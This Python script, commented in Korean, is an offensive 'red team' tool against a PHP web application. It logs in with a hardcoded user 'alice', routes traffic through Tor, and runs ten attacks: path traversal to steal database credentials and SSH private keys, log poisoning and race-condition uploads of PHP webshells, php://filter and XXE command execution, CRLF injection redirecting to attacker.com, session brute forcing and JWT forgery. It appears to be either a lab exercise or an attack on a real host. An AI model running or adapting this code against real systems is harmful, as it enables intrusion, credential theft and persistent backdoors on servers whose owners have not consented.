#!/usr/bin/env python3
"""
고급 레드팀 공격 기법
alice 세션 활용 + 공격적인 침투 방법
"""

import requests
import json
import sys
import time
import base64
import random
import string

class AdvancedRedTeam:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.base_url = f"http://{target_ip}"

        self.session = requests.Session()
        self.session.proxies = {
            'http': 'socks5h://127.0.0.1:9050',
            'https': 'socks5h://127.0.0.1:9050'
        }

    def login(self):
        """alice 로그인"""
        data = {'username': 'alice', 'password': 'alice2024'}
        resp = self.session.post(f"{self.base_url}/login.php", data=data, allow_redirects=True)
        return 'login.php' not in resp.url

    # ========== 방법 1: Memory Dump / Process Injection ==========
    def dump_php_memory(self):
        """PHP 프로세스 메모리에서 비밀 정보 추출"""
        print("\n[1] PHP 메모리 덤프 시도...")

        # /proc/self/environ 읽기
        paths = [
            "/proc/self/environ",  # 환경변수
            "/proc/self/cmdline",  # 명령줄
            "/proc/self/maps",     # 메모리 맵
            "/proc/self/status",   # 프로세스 상태
        ]

        for path in paths:
            url = f"{self.base_url}/file.php?name=../../../..{path}"
            resp = self.session.get(url, timeout=5)
            if resp.status_code == 200 and len(resp.text) > 10:
                print(f"[+] {path} 읽기 성공")
                if 'AWS' in resp.text or 'SECRET' in resp.text or 'KEY' in resp.text:
                    print(f"    [!] 민감 정보 발견!\n{resp.text[:500]}")

    # ========== 방법 2: Database Credential Extraction ==========
    def extract_db_creds(self):
        """데이터베이스 연결 정보 추출"""
        print("\n[2] DB 자격증명 추출 시도...")

        config_files = [
            "../config.php",
            "../../config.php",
            "../../../var/www/html/config.php",
            "../wp-config.php",
            "../database.php",
            "../includes/config.php",
            "../../../etc/mysql/my.cnf",
        ]

        for config in config_files:
            url = f"{self.base_url}/file.php?name={config}"
            resp = self.session.get(url, timeout=5)

            if 'mysql' in resp.text.lower() or 'password' in resp.text.lower():
                print(f"[+] ✅ DB 설정 발견: {config}")
                print(f"{resp.text[:500]}")

                # DB 자격증명 파싱
                import re
                passwords = re.findall(r'["\']password["\']\s*=>\s*["\']([^"\']+)', resp.text, re.IGNORECASE)
                users = re.findall(r'["\']user(?:name)?["\']\s*=>\s*["\']([^"\']+)', resp.text, re.IGNORECASE)
                hosts = re.findall(r'["\']host["\']\s*=>\s*["\']([^"\']+)', resp.text, re.IGNORECASE)

                if passwords:
                    print(f"    [!] DB 비밀번호: {passwords}")
                if users:
                    print(f"    [!] DB 사용자: {users}")
                if hosts:
                    print(f"    [!] DB 호스트: {hosts}")

                return {'users': users, 'passwords': passwords, 'hosts': hosts}

        return None

    # ========== 방법 3: SSH Key Theft ==========
    def steal_ssh_keys(self):
        """SSH 개인키 탈취"""
        print("\n[3] SSH 키 탈취 시도...")

        ssh_keys = [
            "../../../home/ubuntu/.ssh/id_rsa",
            "../../../home/ubuntu/.ssh/id_ed25519",
            "../../../home/ec2-user/.ssh/id_rsa",
            "../../../root/.ssh/id_rsa",
            "../../../home/www-data/.ssh/id_rsa",
        ]

        for key_path in ssh_keys:
            url = f"{self.base_url}/file.php?name={key_path}"
            resp = self.session.get(url, timeout=5)

            if 'BEGIN' in resp.text and 'PRIVATE KEY' in resp.text:
                print(f"[+] ✅✅✅ SSH 개인키 발견: {key_path}")
                print(f"\n{resp.text}\n")

                # 파일로 저장
                filename = f"stolen_key_{int(time.time())}.pem"
                with open(filename, 'w') as f:
                    f.write(resp.text)
                print(f"[+] 저장됨: {filename}")
                print(f"[*] 사용법:")
                print(f"    chmod 600 {filename}")
                print(f"    ssh -i {filename} ubuntu@{self.target_ip}")

                return key_path

        print("[-] SSH 키 없음")
        return None

    # ========== 방법 4: Log Poisoning (Advanced) ==========
    def log_poisoning_advanced(self):
        """로그 포이즈닝 + LFI = RCE"""
        print("\n[4] 고급 로그 포이즈닝...")

        # 1. PHP 코드 삽입
        php_backdoor = '<?php system($_GET["z"]); ?>'

        # User-Agent에 PHP 코드 삽입
        self.session.headers['User-Agent'] = php_backdoor

        # 2. 요청 보내서 로그에 기록
        try:
            self.session.get(f"{self.base_url}/", timeout=5)
        except:
            pass

        # 3. 로그 파일 LFI로 실행
        log_files = [
            "../../../var/log/apache2/access.log",
            "../../../var/log/nginx/access.log",
            "/var/log/apache2/access.log",
            "/var/log/nginx/access.log",
        ]

        for log in log_files:
            # 명령 실행 테스트 (ls 대신 cat /etc/hostname)
            url = f"{self.base_url}/file.php?name={log}&z=cat%20/etc/hostname"
            resp = self.session.get(url, timeout=5)

            if resp.status_code == 200 and len(resp.text.strip()) > 0:
                # 로그 내용이 아닌 명령 결과만 있으면 성공
                if 'GET' not in resp.text[:100]:
                    print(f"[+] ✅ 로그 포이즈닝 성공: {log}")
                    print(f"    명령 실행 가능!")
                    return log

        print("[-] 로그 포이즈닝 실패")
        return None

    # ========== 방법 5: Session Fixation / Hijacking ==========
    def session_hijacking(self):
        """다른 사용자 세션 탈취"""
        print("\n[5] 세션 하이재킹 시도...")

        # 약한 세션 ID 생성 패턴 찾기
        session_ids = []

        for i in range(5):
            resp = self.session.get(f"{self.base_url}/login.php")
            if 'PHPSESSID' in self.session.cookies:
                sid = self.session.cookies['PHPSESSID']
                session_ids.append(sid)
                print(f"    세션 #{i+1}: {sid}")

        # 패턴 분석
        if session_ids:
            # 숫자만? 시간 기반?
            all_numeric = all(sid.isdigit() for sid in session_ids)
            if all_numeric:
                print(f"[!] 약한 세션 ID (숫자만) 발견!")

                # 브루트포스 시도
                print(f"[*] 세션 ID 브루트포스 시도...")
                for test_id in range(int(session_ids[0]) - 100, int(session_ids[0]) + 100):
                    test_cookies = {'PHPSESSID': str(test_id)}
                    resp = self.session.get(f"{self.base_url}/index.php", cookies=test_cookies)

                    if 'alice' not in resp.text and 'Welcome' in resp.text:
                        print(f"[+] ✅ 다른 사용자 세션 발견: {test_id}")
                        return test_id

    # ========== 방법 6: File Upload Race Condition ==========
    def race_condition_upload(self):
        """경쟁 상태 공격으로 웹쉘 업로드"""
        print("\n[6] Race Condition 파일 업로드...")

        import threading

        # PHP 웹쉘
        webshell_content = b'<?php system($_GET["c"]); ?>'

        success = False
        webshell_url = None

        def upload_thread():
            nonlocal success, webshell_url

            random_name = ''.join(random.choices(string.ascii_lowercase, k=8))
            filename = f"race_{random_name}.php"

            files = {
                'file': (filename, webshell_content, 'image/jpeg'),
                'submit': (None, 'Upload')
            }

            try:
                resp = self.session.post(f"{self.base_url}/upload.php", files=files, timeout=5)

                # 즉시 접근 시도
                test_url = f"{self.base_url}/uploads/{filename}?c=hostname"
                test_resp = self.session.get(test_url, timeout=2)

                if test_resp.status_code == 200 and len(test_resp.text.strip()) > 0:
                    if 'ip-' in test_resp.text or 'localhost' in test_resp.text:
                        success = True
                        webshell_url = test_url
                        print(f"    [+] ✅ Race Condition 성공: {filename}")
            except:
                pass

        # 동시 업로드
        threads = []
        for _ in range(20):
            t = threading.Thread(target=upload_thread)
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        if success:
            print(f"[+] 웹쉘 URL: {webshell_url}")
            return webshell_url

        print("[-] Race Condition 실패")
        return None

    # ========== 방법 7: PHP Filter Chain (RCE without Upload) ==========
    def php_filter_chain_rce(self):
        """PHP 필터 체인을 이용한 RCE (업로드 없이)"""
        print("\n[7] PHP Filter Chain RCE...")

        # 이 기법은 복잡하지만 매우 강력함
        # LFI를 RCE로 변환

        # base64 인코딩된 PHP 코드
        php_code = '<?php system("hostname"); ?>'
        encoded = base64.b64encode(php_code.encode()).decode()

        filter_chain = f"php://filter/convert.base64-decode/resource=data://text/plain;base64,{encoded}"

        url = f"{self.base_url}/file.php?name={filter_chain}"

        try:
            resp = self.session.get(url, timeout=5)
            if 'ip-' in resp.text or 'ec2' in resp.text:
                print(f"[+] ✅ PHP Filter Chain RCE 성공!")
                print(f"    응답: {resp.text[:200]}")
                return True
        except:
            pass

        print("[-] PHP Filter Chain 실패")
        return False

    # ========== 방법 8: XXE with PHP Wrappers ==========
    def xxe_php_wrapper(self):
        """XXE + PHP 래퍼로 파일 읽기"""
        print("\n[8] XXE + PHP Wrapper 공격...")

        # PHP Expect 래퍼
        xxe_payload = """<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "expect://hostname">
]>
<data>&xxe;</data>"""

        try:
            resp = self.session.post(
                f"{self.base_url}/upload.php",
                data=xxe_payload,
                headers={'Content-Type': 'application/xml'},
                timeout=10
            )

            if resp.status_code == 200 and len(resp.text) > 0:
                print(f"[+] XXE 응답:\n{resp.text[:500]}")
        except:
            pass

    # ========== 방법 9: CRLF Injection to Session Poisoning ==========
    def crlf_injection(self):
        """CRLF 인젝션으로 세션 포이즈닝"""
        print("\n[9] CRLF Injection 공격...")

        # HTTP 헤더 인젝션
        crlf_payloads = [
            "%0d%0aSet-Cookie:%20admin=true",
            "%0d%0aLocation:%20http://attacker.com",
            "\r\nSet-Cookie: role=admin\r\n",
        ]

        for payload in crlf_payloads:
            try:
                url = f"{self.base_url}/redirect.php?url={payload}"
                resp = self.session.get(url, timeout=5, allow_redirects=False)

                if 'Set-Cookie' in resp.headers:
                    print(f"[+] ✅ CRLF 인젝션 성공!")
                    print(f"    헤더: {resp.headers}")
            except:
                pass

    # ========== 방법 10: Exploiting Weak JWT ==========
    def jwt_attack(self):
        """JWT 토큰 위조/크랙"""
        print("\n[10] JWT 공격...")

        # 쿠키나 localStorage에서 JWT 찾기
        try:
            resp = self.session.get(f"{self.base_url}/api/user", timeout=5)

            if 'eyJ' in resp.text:  # JWT 시작 패턴
                import re
                jwts = re.findall(r'eyJ[A-Za-z0-9-_]+\.eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+', resp.text)

                for jwt in jwts:
                    print(f"[+] JWT 발견: {jwt[:50]}...")

                    # JWT 디코딩
                    parts = jwt.split('.')
                    if len(parts) == 3:
                        header = base64.urlsafe_b64decode(parts[0] + '==').decode()
                        payload = base64.urlsafe_b64decode(parts[1] + '==').decode()

                        print(f"    헤더: {header}")
                        print(f"    페이로드: {payload}")

                        # None 알고리즘 공격 시도
                        fake_header = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').decode().rstrip('=')
                        fake_payload = base64.urlsafe_b64encode(b'{"user":"admin","role":"admin"}').decode().rstrip('=')
                        fake_jwt = f"{fake_header}.{fake_payload}."

                        print(f"[*] 위조 JWT: {fake_jwt}")
        except:
            pass

    # ========== 실행 ==========
    def run(self):
        print("="*60)
        print("고급 레드팀 공격 기법")
        print("alice 세션 + 공격적인 침투")
        print("="*60)

        if not self.login():
            print("[-] 로그인 실패")
            return

        print("[+] alice 로그인 성공\n")

        methods = [
            ("PHP 메모리 덤프", self.dump_php_memory),
            ("DB 자격증명 추출", self.extract_db_creds),
            ("SSH 키 탈취", self.steal_ssh_keys),
            ("고급 로그 포이즈닝", self.log_poisoning_advanced),
            ("세션 하이재킹", self.session_hijacking),
            ("Race Condition 업로드", self.race_condition_upload),
            ("PHP Filter Chain RCE", self.php_filter_chain_rce),
            ("XXE + PHP Wrapper", self.xxe_php_wrapper),
            ("CRLF 인젝션", self.crlf_injection),
            ("JWT 공격", self.jwt_attack),
        ]

        for name, method in methods:
            try:
                print(f"\n{'='*60}")
                result = method()

                if result:
                    print(f"\n[+] ✅✅✅ {name} 성공!")
                    print(f"[!] 다음 단계로 진행 가능!")

                time.sleep(1)

            except Exception as e:
                print(f"[-] {name} 오류: {str(e)[:100]}")

        print("\n" + "="*60)
        print("[+] 고급 레드팀 공격 완료!")
        print("="*60)

def main():
    if len(sys.argv) < 2:
        print("사용법: python3 95_advanced_redteam.py <TARGET_IP>")
        print("예시: python3 95_advanced_redteam.py 43.201.154.142")
        sys.exit(1)

    target_ip = sys.argv[1]
    redteam = AdvancedRedTeam(target_ip)
    redteam.run()

if __name__ == "__main__":
    main()
